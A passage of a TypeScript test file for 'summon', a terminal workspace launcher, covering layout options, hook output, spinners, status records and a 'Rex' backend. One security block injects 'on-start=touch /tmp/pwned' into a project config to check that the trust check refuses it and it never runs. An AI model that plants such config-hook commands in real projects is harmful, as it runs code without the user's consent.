      "newTab",
      "newWindow",
    ]);
  });

  it("forwards all 9 fields with correct values (exhaustiveness at runtime)", () => {
    const result = layoutOptsToTreePlanOpts({
      autoResize: false,
      editorSize: 65,
      fontSize: 12,
      newWindow: true,
      newTab: false,
      fullscreen: true,
      maximize: false,
      float: true,
      cleanRestoredPanes: true,
    });
    expect(result.autoResize).toBe(false);
    expect(result.editorSize).toBe(65);
    expect(result.fontSize).toBe(12);
    expect(result.newWindow).toBe(true);
    expect(result.newTab).toBe(false);
    expect(result.fullscreen).toBe(true);
    expect(result.maximize).toBe(false);
    expect(result.float).toBe(true);
    expect(result.cleanRestoredPanes).toBe(true);
  });
});

describe("SE-L3: on-start command is not echoed to stdout (#557)", () => {
  it("on-start is executed without printing command string to stdout", async () => {
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map([["on-start", "echo hello"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    try {
      await launch("/tmp/workspace");
      const allLogs = logSpy.mock.calls.flat().map(String).join("\n");
      // The command string itself should not appear in stdout
      expect(allLogs).not.toContain("Running on-start:");
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
      logSpy.mockRestore();
    }
  });
});

describe("SE-M1 (#595): on-stop command surfaced at launch time", () => {
  it("prints an informational notice to stderr when on-stop is configured", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const hook = "notify --token sensitive-value";
    mockReadKVFile.mockReturnValue(new Map([["on-stop", hook]]));
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    const warnSpy = stderrSpy; // UX-M2: warnings are stderr writes

    await launch("/tmp/workspace");

    const allStderr = stderrSpy.mock.calls.map(c => String(c[0])).join("\n");
    // The notice identifies the hook without disclosing its contents.
    expect(allStderr).toMatch(/on-stop/i);
    expect(allStderr).not.toContain(hook);

    stderrSpy.mockRestore();
    logSpy.mockRestore();
    errorSpy.mockRestore();
    warnSpy.mockRestore();
  });

  it("does not print on-stop notice when on-stop is not configured", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    mockReadKVFile.mockReturnValue(new Map());
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    const warnSpy = stderrSpy; // UX-M2: warnings are stderr writes

    await launch("/tmp/workspace");

    const allStderr = stderrSpy.mock.calls.map(c => String(c[0])).join("\n");
    expect(allStderr).not.toMatch(/on-stop/i);

    stderrSpy.mockRestore();
    logSpy.mockRestore();
    errorSpy.mockRestore();
    warnSpy.mockRestore();
  });
});

describe("SE-M1: every .summon read is content-pinned", () => {
  const SUMMON = "/tmp/workspace/.summon";
  let summonContent: string | undefined;
  let fallback: ((...args: unknown[]) => unknown) | undefined;
  beforeEach(async () => {
    const fs = await import("node:fs");
    fallback = vi.mocked(fs.readFileSync).getMockImplementation() as typeof fallback;
    summonContent = undefined;
    vi.mocked(fs.readFileSync).mockImplementation(((path: string, ...rest: unknown[]) => {
      if (String(path) === SUMMON && summonContent !== undefined) return summonContent;
      // A file the fixture says is absent cannot be read either.
      if (String(path) === SUMMON && !fs.existsSync(path)) throw Object.assign(new Error(`ENOENT: ${path}`), { code: "ENOENT" });
      return fallback!(path, ...rest);
    }) as never);
  });
  afterEach(async () => {
    const fs = await import("node:fs");
    vi.mocked(fs.readFileSync).mockImplementation(fallback as never);
  });

  function wizardThatEdits(next: string): void {
    mockRunSetup.mockImplementation(async () => {
      summonContent = next;
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    });
  }

  async function withTTY<T>(fn: () => Promise<T>): Promise<T> {
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
    try { return await fn(); } finally { Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true }); }
  }

  it("after the setup wizard, a .summon changed meanwhile is checked again and refused before anything runs", async () => {
    const { SummonError } = await import("./trust.js");
    vi.mocked(listConfig).mockReturnValue(new Map());
    summonContent = "sidebar=lazygit\n";
    wizardThatEdits("sidebar=lazygit\non-start=touch /tmp/pwned\n");
    mockAssertTrustedContent.mockImplementation((_dir: string, content: string) => {
      if (content.includes("pwned")) throw new SummonError("untrusted");
    });
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    try {
      await expect(withTTY(() => launch("/tmp/workspace"))).rejects.toBeInstanceOf(SummonError);
    } finally {
      logSpy.mockRestore();
    }
    expect(mockAssertTrustedContent).toHaveBeenLastCalledWith("/tmp/workspace", "sidebar=lazygit\non-start=touch /tmp/pwned\n");
    expect(mockReadKVFile).not.toHaveBeenCalledWith(SUMMON);
    expect(mockExecSync).not.toHaveBeenCalled();
    expect(mockGenerateAppleScript).not.toHaveBeenCalled();
  });

  it("after the setup wizard, an unchanged trusted .summon is used from the bytes that were checked", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map());
    summonContent = "sidebar=lazygit\n";
    wizardThatEdits("sidebar=lazygit\n");
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    try {
      await withTTY(() => launch("/tmp/workspace"));
    } finally {
      logSpy.mockRestore();
    }
    expect(mockAssertTrustedContent).toHaveBeenCalledTimes(2);
    expect(mockReadKVFile).not.toHaveBeenCalledWith(SUMMON);
    expect(mockGenerateAppleScript).toHaveBeenCalled();
  });

  it("resolveConfig never reads .summon itself: without trusted content the project config is empty", () => {
    mockReadKVFile.mockImplementation((path: string) => path === SUMMON ? new Map([["on-start", "touch /tmp/pwned"]]) : new Map());
    const resolved = resolveConfig("/tmp/workspace", {}, undefined);
    expect(resolved.onStart).toBeUndefined();
    expect(resolved.projectOverrides.size).toBe(0);
    expect(mockReadKVFile).not.toHaveBeenCalled();
    expect(resolveConfig("/tmp/workspace", {}, "on-start=echo hi\n").onStart).toBe("echo hi");
  });

  it("a .summon that appears after the trust check found none is never parsed (launch, and the resolveConfig of freeze/keybindings)", async () => {
    vi.mocked(existsSync).mockImplementation((path) => String(path) !== SUMMON || summonContent !== undefined);
    // The file is created right after the check (assertTrusted sees no file and returns).
    mockAssertTrusted.mockImplementation(() => {
      summonContent = "on-start=touch /tmp/pwned\n";
      mockReadKVFile.mockImplementation((path: string) => path === SUMMON ? new Map([["on-start", "touch /tmp/pwned"]]) : new Map());
    });
    const resolved = resolveConfig("/tmp/workspace", {}, readTrustedSummonFile("/tmp/workspace", {}));
    expect(mockAssertTrusted).toHaveBeenCalledWith("/tmp/workspace");
    expect(resolved.onStart).toBeUndefined();
    expect(resolved.projectOverrides.size).toBe(0);
    summonContent = undefined;
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    try {
      await launch("/tmp/workspace");
    } finally {
      logSpy.mockRestore();
      mockReadKVFile.mockReset();
      mockReadKVFile.mockReturnValue(new Map());
    }
    expect(mockExecSync).not.toHaveBeenCalledWith("touch /tmp/pwned", expect.anything());
    expect(mockExecSync.mock.calls.flat()).not.toContain("touch /tmp/pwned");
  });

  it("readTrustedSummonFile reads once, with no existence check: a missing or unreadable file is checked as no file", async () => {
    const fs = await import("node:fs");
    vi.mocked(fs.existsSync).mockClear();
    for (const code of ["ENOENT", "EISDIR"]) {
      mockAssertTrusted.mockClear();
      mockAssertTrustedContent.mockClear();
      vi.mocked(fs.readFileSync).mockImplementationOnce(() => { throw Object.assign(new Error(code), { code }); });
      expect(readTrustedSummonFile("/tmp/workspace", {})).toBe("");
      expect(mockAssertTrusted).toHaveBeenCalledWith("/tmp/workspace");
      expect(mockAssertTrustedContent).not.toHaveBeenCalled();
    }
    expect(vi.mocked(fs.existsSync)).not.toHaveBeenCalledWith(SUMMON);
  });

  it("readTrustedSummonFile returns the checked bytes, skips with --no-project-config and propagates a refusal", async () => {
    const { SummonError } = await import("./trust.js");
    summonContent = "editor=nvim\n";
    expect(readTrustedSummonFile("/tmp/workspace", {})).toBe("editor=nvim\n");
    expect(mockAssertTrustedContent).toHaveBeenCalledWith("/tmp/workspace", "editor=nvim\n");
    mockAssertTrustedContent.mockClear();
    expect(readTrustedSummonFile("/tmp/workspace", { "no-project-config": "true" })).toBeUndefined();
    expect(mockAssertTrustedContent).not.toHaveBeenCalled();
    mockAssertTrustedContent.mockImplementation(() => { throw new SummonError("untrusted"); });
    expect(() => readTrustedSummonFile("/tmp/workspace", {})).toThrow(SummonError);
  });
});

// --- UX-L2 (#519): single-launch spinner ---

describe("UX-L2 (#519): single-launch spinner", () => {
  it("isStaticLaunchSpinner: returns true when stdout is not a TTY", () => {
    const origIsTTY = process.stdout.isTTY;
    Object.defineProperty(process.stdout, "isTTY", { value: false, configurable: true });
    try {
      expect(isStaticLaunchSpinner()).toBe(true);
    } finally {
      Object.defineProperty(process.stdout, "isTTY", { value: origIsTTY, configurable: true });
    }
  });

  it("isStaticLaunchSpinner: returns true when NO_COLOR is set", () => {
    const origIsTTY = process.stdout.isTTY;
    const origNoColor = process.env.NO_COLOR;
    Object.defineProperty(process.stdout, "isTTY", { value: true, configurable: true });
    process.env.NO_COLOR = "1";
    try {
      expect(isStaticLaunchSpinner()).toBe(true);
    } finally {
      Object.defineProperty(process.stdout, "isTTY", { value: origIsTTY, configurable: true });
      if (origNoColor === undefined) {
        delete process.env.NO_COLOR;
      } else {
        process.env.NO_COLOR = origNoColor;
      }
    }
  });

  it("isStaticLaunchSpinner: returns true when SUMMON_NO_SPINNER is set", () => {
    const origIsTTY = process.stdout.isTTY;
    const origNoSpinner = process.env.SUMMON_NO_SPINNER;
    Object.defineProperty(process.stdout, "isTTY", { value: true, configurable: true });
    process.env.SUMMON_NO_SPINNER = "1";
    try {
      expect(isStaticLaunchSpinner()).toBe(true);
    } finally {
      Object.defineProperty(process.stdout, "isTTY", { value: origIsTTY, configurable: true });
      if (origNoSpinner === undefined) {
        delete process.env.SUMMON_NO_SPINNER;
      } else {
        process.env.SUMMON_NO_SPINNER = origNoSpinner;
      }
    }
  });

  it("withLaunchSpinner: static mode — writes label to both stderr and stdout", () => {
    const origIsTTY = process.stdout.isTTY;
    Object.defineProperty(process.stdout, "isTTY", { value: false, configurable: true });
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const stdoutSpy = vi.spyOn(process.stdout, "write").mockImplementation(() => true);
    let ran = false;
    try {
      withLaunchSpinner("Summoning test…", () => { ran = true; });
      expect(ran).toBe(true);
      // stderr should contain the label
      const allStderr = stderrSpy.mock.calls.map(c => String(c[0])).join("");
      expect(allStderr).toContain("Summoning test…");
      // stdout should contain the label (static line)
      const allStdout = stdoutSpy.mock.calls.map(c => String(c[0])).join("");
      expect(allStdout).toContain("Summoning test…");
    } finally {
      Object.defineProperty(process.stdout, "isTTY", { value: origIsTTY, configurable: true });
      stderrSpy.mockRestore();
      stdoutSpy.mockRestore();
    }
  });

  it("withLaunchSpinner: TTY mode — writes spinner frame to stdout and clears after", () => {
    const origIsTTY = process.stdout.isTTY;
    const origForceColor = process.env.FORCE_COLOR;
    const origNoColor = process.env.NO_COLOR;
    const origNoSpinner = process.env.SUMMON_NO_SPINNER;
    Object.defineProperty(process.stdout, "isTTY", { value: true, configurable: true });
    process.env.FORCE_COLOR = "1";
    delete process.env.NO_COLOR;
    delete process.env.SUMMON_NO_SPINNER;
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const stdoutSpy = vi.spyOn(process.stdout, "write").mockImplementation(() => true);
    let ran = false;
    try {
      withLaunchSpinner("Summoning test…", () => { ran = true; });
      expect(ran).toBe(true);
      const allStdout = stdoutSpy.mock.calls.map(c => String(c[0])).join("");
      // Should contain a spinner frame and the label
      expect(allStdout).toContain("Summoning test…");
      // Should clear (erase-to-end-of-line)
      expect(allStdout).toContain("\r\x1b[K");
    } finally {
      Object.defineProperty(process.stdout, "isTTY", { value: origIsTTY, configurable: true });
      if (origForceColor === undefined) {
        delete process.env.FORCE_COLOR;
      } else {
        process.env.FORCE_COLOR = origForceColor;
      }
      if (origNoColor === undefined) {
        delete process.env.NO_COLOR;
      } else {
        process.env.NO_COLOR = origNoColor;
      }
      if (origNoSpinner === undefined) {
        delete process.env.SUMMON_NO_SPINNER;
      } else {
        process.env.SUMMON_NO_SPINNER = origNoSpinner;
      }
      stderrSpy.mockRestore();
      stdoutSpy.mockRestore();
    }
  });

  it("launch: spinner label written to stderr during real launch (non-TTY static mode)", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const origIsTTY = process.stdout.isTTY;
    Object.defineProperty(process.stdout, "isTTY", { value: false, configurable: true });
    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    const stdoutSpy = vi.spyOn(process.stdout, "write").mockImplementation(() => true);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    try {
      await launch("/tmp/workspace");

      const allStderr = [
        ...stderrSpy.mock.calls.map(c => String(c[0])),
        ...errorSpy.mock.calls.flat().map(String),
      ].join("\n");
      // The spinner label should include "Summoning" and end up in stderr
      expect(allStderr).toMatch(/summon/i);

      // stdout spinner line should also be present
      const allStdout = stdoutSpy.mock.calls.map(c => String(c[0])).join("");
      expect(allStdout).toMatch(/summon/i);
    } finally {
      Object.defineProperty(process.stdout, "isTTY", { value: origIsTTY, configurable: true });
      stderrSpy.mockRestore();
      stdoutSpy.mockRestore();
      errorSpy.mockRestore();
    }
  });
});


describe("P2 capture failure isolation",()=>{
  const id="00000000-0000-4000-8000-000000000001";
  it.each(["", "SUMMON_NATIVE_UNAVAILABLE", "SUMMON_NATIVE_V1\ninvalid", "x".repeat(65537)])("launch stays successful for invalid capture",async output=>{
    const status=await import("./status-record.js");
    mockExecFileSync.mockImplementation((bin:string,args:string[],opts?:{input?:string})=> bin === "/usr/bin/which" ? "/usr/bin/stub\n" : opts?.input ? output : "");
    await expect(launch("/tmp/workspace",{layout:"minimal"})).resolves.toBe("launched");
    expect(status.publishStatus).toHaveBeenCalledWith(expect.objectContaining({project:"workspace",version:1}));
    expect(vi.mocked(status.publishStatus).mock.calls[0]?.[0].native).toBeUndefined();
    expect(mockExecFileSync.mock.calls.filter(c=>/close (window|tab) /.test(String(c[2]?.input)))).toHaveLength(0);
  });
  it("maps successful capture and warns without throwing on status write failure",async()=>{
    const status=await import("./status-record.js"); const err=vi.spyOn(process.stderr,"write").mockImplementation(()=>true);
    mockExecFileSync.mockImplementation((bin:string,args:string[],opts?:{input?:string})=>bin === "/usr/bin/which" ? "/usr/bin/stub\n" : opts?.input ? `SUMMON_NATIVE_V1\n${id}\n00000000-0000-4000-8000-000000000002\n` : "");
    vi.mocked(status.publishStatus).mockReturnValueOnce("discarded");
    await expect(launch("/tmp/workspace",{layout:"minimal"})).resolves.toBe("launched");
    expect(status.publishStatus).toHaveBeenCalledWith(expect.objectContaining({native:expect.objectContaining({rootTerminalId:id})}));
    expect(err).toHaveBeenCalledWith(expect.stringContaining("status could not be saved; exact targeting is unavailable"));
    // The publication layer owns the discard (bound to the record observed under its lock); the launcher only words the outcome.
    vi.mocked(status.publishStatus).mockReturnValueOnce("unsaved");
    await expect(launch("/tmp/workspace",{layout:"minimal"})).resolves.toBe("launched");
    expect(err).toHaveBeenCalledWith(expect.stringContaining("could not be saved or invalidated. Previous metadata may remain"));
    err.mockRestore();
  });
});

const statusModule = await import("./status-record.js");

describe("backend seam (plan P15, Phase 1)", () => {
  const status = statusModule;

  it("dry-run header names the backend and the launch id", async () => {
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    await launch("/tmp/workspace", { dryRun: true });
    const output = logSpy.mock.calls.map((c) => String(c[0])).join("\n");
    logSpy.mockRestore();
    const header = output.split("\n").filter((line) => line.startsWith("-- "));
    expect(header[0]).toBe("-- summon dry-run");
    expect(header).toContain("-- Backend: ghostty");
    expect(header.find((line) => line.startsWith("-- Launch: "))).toMatch(new RegExp(`^-- Launch: ${LAUNCH_ID_RE.source.slice(1, -1)}$`));
  });

  it("dry-run header for a tree layout also names the backend and launch id", async () => {
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(new Map([["tree", "a | b"], ["pane.a", "vim"], ["pane.b", "htop"]]));
    vi.mocked(listConfig).mockReturnValue(new Map([["layout", "mytree"]]));
    await launch("/tmp/workspace", { dryRun: true });
    const output = logSpy.mock.calls.map((c) => String(c[0])).join("\n");
    logSpy.mockRestore();
    expect(output).toContain("-- Layout: tree layout, 2 panes");
    expect(output).toContain("-- Backend: ghostty");
    expect(output).toMatch(/-- Launch: [0-9a-f-]{36}/);
  });

  it("publishes the status record with the launch id and backend", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    await launch("/tmp/workspace");
    expect(status.publishStatus).toHaveBeenCalledWith(expect.objectContaining({
      project: "workspace",
      backend: "ghostty",
      launchId: ANY_LAUNCH_ID,
    }));
    const written = vi.mocked(status.publishStatus).mock.calls[0]?.[0];
    const dryRunId = mockGenerateAppleScript.mock.calls[0]?.[6];
    expect(written?.launchId).toBe(dryRunId);
  });

  it("dry-run falls back to the Ghostty script with the detection notices when neither terminal is found; a real launch fails", async () => {
    mockResolveBackendForLaunch.mockReturnValue({ ok: false, reason: "Neither Ghostty.app nor the Rex CLI was found. Install one.", notices: ["Rex detected but its CLI was not found at PATH"] });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const errSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    let stderrText: string;
    let output: string;
    try {
      await launch("/tmp/workspace", { dryRun: true });
      stderrText = errSpy.mock.calls.map((c) => String(c[0])).join("");
      output = logSpy.mock.calls.map((c) => String(c[0])).join("\n");
      await expect(launch("/tmp/workspace")).rejects.toThrow("Neither Ghostty.app nor the Rex CLI was found");
    } finally {
      errSpy.mockRestore();
      logSpy.mockRestore();
    }
    expect(stderrText).toContain("Rex detected but its CLI was not found at PATH");
    expect(stderrText).toContain("Neither Ghostty.app nor the Rex CLI was found. Install one. Dry run continues with the Ghostty script.");
    expect(output).toContain("-- Backend: ghostty");
    expect(status.publishStatus).not.toHaveBeenCalled();
  });

  it("prints detection notices and continues on Ghostty when the table says so", async () => {
    mockResolveBackendForLaunch.mockReturnValue({ ok: true, backend: "ghostty", placement: "inside-rex", notices: ["Rex detected but its CLI was not found at PATH"] });
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    const errSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    let stderrText: string;
    try {
      await launch("/tmp/workspace");
      stderrText = errSpy.mock.calls.map((c) => String(c[0])).join("");
    } finally {
      errSpy.mockRestore();
    }
    expect(stderrText).toContain("Rex detected but its CLI was not found at PATH");
    expect(status.publishStatus).toHaveBeenCalledWith(expect.objectContaining({ backend: "ghostty" }));
  });
});

describe("Rex dry run (plan P2, Phase 2)", () => {
  const REX_CONTEXT = { ok: true, backend: "rex", placement: "inside-rex", server: "unix:///tmp/rex.sock", rexBinary: "/usr/local/bin/rex", notices: [] };

  /** Calls that would drive a terminal: AppleScript or the Rex CLI. */
  const terminalCalls = () => mockExecFileSync.mock.calls.filter((c) => c[0] === "osascript" || String(c[0]).endsWith("/rex"));

  async function dryRun(overrides: Record<string, unknown> = {}, config: Array<[string, string]> = [["editor", "vim"]]): Promise<string> {
    mockResolveBackendForLaunch.mockReturnValue(REX_CONTEXT);
    vi.mocked(listConfig).mockReturnValue(new Map(config));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    try {
      await launch("/tmp/workspace", { dryRun: true, ...overrides });
      // The dry run is the last console.log call; config notices may precede it.
      return String(logSpy.mock.calls.at(-1)?.[0]);
    } finally {
      logSpy.mockRestore();
    }
  }

  function requestOf(output: string): { label: string; initial_windows: Array<{ window_label: string; layout: unknown }> } {
    const json = output.split("\n").filter((line) => !line.startsWith("-- ")).join("\n");
    return JSON.parse(json);
  }

  it("prints the header, the session.create request and the pane order instead of AppleScript, and runs nothing", async () => {
    const output = await dryRun({ env: ["FOO=bar"] });

    expect(output).toMatch(/^-- summon dry-run\n/);
    expect(output).toContain("-- Layout: 2 editor panes, editor=vim, sidebar=lazygit, shell=true");
    expect(output).toContain("-- Target: /tmp/workspace");
    expect(output).toContain("-- Backend: rex");
    expect(output).toMatch(/-- Launch: [0-9a-f-]{36}/);
    expect(output).toContain("-- Server: unix:///tmp/rex.sock");
    expect(output).toContain("-- Pane order (block_ids): editor, right-1, shell, sidebar");
    expect(output).not.toContain("-- Note:");
    expect(output).not.toContain('tell application "Ghostty"');

    const request = requestOf(output);
    expect(request.label).toBe("workspace");
    expect(request.initial_windows[0]!.window_label).toBe("[workspace]");
    const launchId = /-- Launch: ([0-9a-f-]{36})/.exec(output)![1];
    expect(output).toContain(`"SUMMON_LAUNCH_ID=${launchId}"`);
    expect(output).toContain('"FOO=bar"');
    // The printed request is the one a real launch sends: the root cleanup trap carries the layout label.
    expect(output).toContain('--layout \\"default\\"');
    expect(output).not.toContain('--layout \\"unknown\\"');

    expect(mockGenerateAppleScript).not.toHaveBeenCalled();
    expect(mockGenerateTreeAppleScript).not.toHaveBeenCalled();
    expect(terminalCalls()).toEqual([]);
    expect(mockExecSync).not.toHaveBeenCalled();
    expect(statusModule.publishStatus).not.toHaveBeenCalled();
  });

  it("prints the tree request with the tree's pane order", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(new Map([["tree", "(editor / shell) | sidebar"], ["pane.editor", "claude"], ["pane.shell", "npm run dev"], ["pane.sidebar", "lazygit"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    const output = await dryRun();

    expect(output).toContain("-- Layout: tree layout, 3 panes");
    expect(output).toContain("-- Backend: rex");
    expect(output).toContain("-- Pane order (block_ids): editor, shell, sidebar");
    const request = requestOf(output);
    expect(request.initial_windows[0]!.layout).toMatchObject({ split: { direction: "horizontal", ratio: 0.75 } });
    expect(mockGenerateTreeAppleScript).not.toHaveBeenCalled();
    expect(terminalCalls()).toEqual([]);
  });

  it("includes the starship preset path in the env wrapper and the header", async () => {
    mockGetPresetConfigPath.mockReturnValue("/mock/.config/summon/starship/tokyo-night.toml");
    const output = await dryRun({}, [["editor", "vim"], ["starship-preset", "tokyo-night"]]);
    expect(output).toContain("-- Starship preset: tokyo-night (/mock/.config/summon/starship/tokyo-night.toml)");
    expect(output).toContain('"STARSHIP_CONFIG=/mock/.config/summon/starship/tokyo-night.toml"');
    expect(mockEnsurePresetConfig).not.toHaveBeenCalled();
  });

  it("notes a recorded Rex workspace without probing or switching to it", async () => {
    mockReadStatusRecord.mockReturnValue({ project: "workspace", backend: "rex", rex: { sessionId: "session:0123" } });
    const output = await dryRun();
    expect(mockReadStatusRecord).toHaveBeenCalledWith("workspace");
    expect(output).toContain("-- Note: workspace is recorded as a Rex workspace (session:0123); while it is running, a real run switches to it instead of creating this one");
    expect(output).toContain('"label": "workspace"');
    expect(terminalCalls()).toEqual([]);
    expect(statusModule.publishStatus).not.toHaveBeenCalled();
  });

  it("does not note a Ghostty record", async () => {
    mockReadStatusRecord.mockReturnValue({ project: "workspace", backend: "ghostty" });
    expect(await dryRun()).not.toContain("-- Note:");
  });
});

describe("Rex launch (plan P2, P8, P13, P15; Phase 3)", () => {
  const REX_CONTEXT = { ok: true, backend: "rex", placement: "inside-rex", server: "unix:///tmp/rex.sock", rexBinary: "/usr/local/bin/rex", notices: [] };
  const rexCalls = () => mockExecFileSync.mock.calls.filter((c) => c[0] === "osascript" || String(c[0]).endsWith("/rex"));
  let stderrText = "";
  let routineText = "";
  let errSpy: ReturnType<typeof vi.spyOn>;
  beforeEach(() => {
    mockResolveBackendForLaunch.mockReturnValue(REX_CONTEXT);
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
    stderrText = "";
    routineText = "";
    errSpy = vi.spyOn(process.stderr, "write").mockImplementation((chunk: unknown) => { stderrText += String(chunk); if (writingRoutine()) routineText += String(chunk); return true; });
  });
  afterEach(() => { errSpy.mockRestore(); });

  it("adopts orphans and decides the switch before the wizard, the pane probe and on-start, and never cleans restored panes", async () => {
    const order: string[] = [];
    mockAdoptOrphansForLaunch.mockImplementation(() => { order.push("adopt"); return [{ text: "adopted earlier launch x" }]; });
    mockMaybeSwitch.mockImplementation(() => { order.push("switch"); return { kind: "proceed" }; });
    mockRunSetup.mockImplementation(async () => { order.push("setup"); vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]])); });
    mockExecSync.mockImplementation(() => { order.push("on-start"); return ""; });
    vi.mocked(listConfig).mockReturnValue(new Map());
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
    try {
      await launch("/tmp/workspace", { "on-start": "echo hi", clean: "true" });
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
    }
    expect(order).toEqual(["adopt", "switch", "setup", "on-start"]);
    expect(mockRunSetup).toHaveBeenCalledWith({ backend: "rex" });
    expect(mockAdoptOrphansForLaunch).toHaveBeenCalledWith("workspace");
    expect(mockMaybeSwitch).toHaveBeenCalledWith("workspace", false, expect.objectContaining({ cliFor: expect.any(Function) }));
    expect(stderrText).toContain("summon: note: adopted earlier launch x");
    expect(stderrText).toContain("summon: note: Rex cannot honor clean; ignored");
    expect(rexCalls()).toEqual([]);
    expect(rexLaunches).toHaveLength(1);
  });

  it("returns after a switch without launching, probing or writing status", async () => {
    mockMaybeSwitch.mockReturnValue({ kind: "switched" });
    mockExecSync.mockImplementation(() => { throw new Error("on-start must not run"); });
    await launch("/tmp/workspace", { "on-start": "echo hi" });
    expect(rexLaunches).toEqual([]);
    expect(mockRunSetup).not.toHaveBeenCalled();
    expect(statusModule.publishStatus).not.toHaveBeenCalled();
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it("arranges for the launcher tab to close after a launch or a switch from inside Rex (D1)", async () => {
    mockCloseLauncherTab.mockClear();
    mockStartLauncherTabWatch.mockClear();
    await launch("/tmp/workspace");
    expect(mockStartLauncherTabWatch).toHaveBeenCalledWith(REX_CONTEXT);
    expect(mockCloseLauncherTab).toHaveBeenCalledWith(REX_CONTEXT);
    mockCloseLauncherTab.mockClear();
    mockMaybeSwitch.mockReturnValue({ kind: "switched" });
    await expect(launch("/tmp/workspace")).resolves.toBe("switched");
    expect(mockCloseLauncherTab).toHaveBeenCalledTimes(1);
  });

  it("never arms a tab close for a dry run (D1)", async () => {
    mockCloseLauncherTab.mockClear();
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    logSpy.mockRestore();
    expect(mockCloseLauncherTab).not.toHaveBeenCalled();
  });

  it("refuses with exit 2 when the recorded workspace cannot be verified", async () => {
    mockMaybeSwitch.mockReturnValue({ kind: "refused", reason: "workspace is recorded in Rex but could not be verified" });
    const exitSpy = vi.spyOn(process, "exit").mockImplementation(((code: number) => { throw new Error(`exit:${code}`); }) as never);
    try {
      await expect(launch("/tmp/workspace")).rejects.toThrow("exit:2");
    } finally {
      exitSpy.mockRestore();
    }
    expect(stderrText).toContain("could not be verified");
    expect(rexLaunches).toEqual([]);
  });

  it("shares one rex listing between late adoption and the switch decision, and not with the backend (PE-L1)", async () => {
    mockAdoptDeps.mockClear();
    await launch("/tmp/workspace");
    expect(mockAdoptDeps).toHaveBeenCalledWith("/usr/local/bin/rex", SHARED_LISTINGS);
    expect(mockMaybeSwitch).toHaveBeenCalledWith("workspace", false, expect.objectContaining({ listings: SHARED_LISTINGS }));
    // The kept-session check runs after the wizard and on-start, so it lists afresh.
    expect(mockCreateRexBackend.mock.calls.at(-1)![1]).not.toHaveProperty("listings");
  });

  it("passes --new-window to the switch decision", async () => {
    await launch("/tmp/workspace", { "new-window": "true" });
    expect(mockMaybeSwitch).toHaveBeenCalledWith("workspace", true, expect.anything());
  });

  it("publishes the Rex identity with the display-order panes and the layout label", async () => {
    await launch("/tmp/workspace", { layout: "full" });
    expect(rexLaunches[0]).toMatchObject({ kind: "traditional", ctx: { projectName: "workspace", layoutLabel: "full", targetDir: "/tmp/workspace" } });
    expect(mockCreateRexBackend).toHaveBeenCalledWith(REX_CONTEXT, expect.objectContaining({ callerSession: process.env["REX_SESSION"] }));
    expect(statusModule.publishStatus).toHaveBeenCalledWith(expect.objectContaining({
      project: "workspace",
      backend: "rex",
      layout: "full",
      panes: ["editor", "sidebar", "editor-2", "right-1", "shell"],
      launchId: ANY_LAUNCH_ID,
      rex: REX_IDENTITY,
    }));
    const written = vi.mocked(statusModule.publishStatus).mock.calls[0]![0];
    expect(written.native).toBeUndefined();
    // Named focus targets resolve through the identity, never through display position.
    expect(written.rex!.blocks.find((b) => b.name === "editor-2")!.blockId).toBe("block:0000aaaa-0000-0000-0000-000000000011");
    expect(written.panes.indexOf("editor-2")).not.toBe(written.rex!.blocks.findIndex((b) => b.name === "editor-2"));
  });

  it("UX-H1: Ghostty-only keys from config are silent under Rex, like clean=true", async () => {
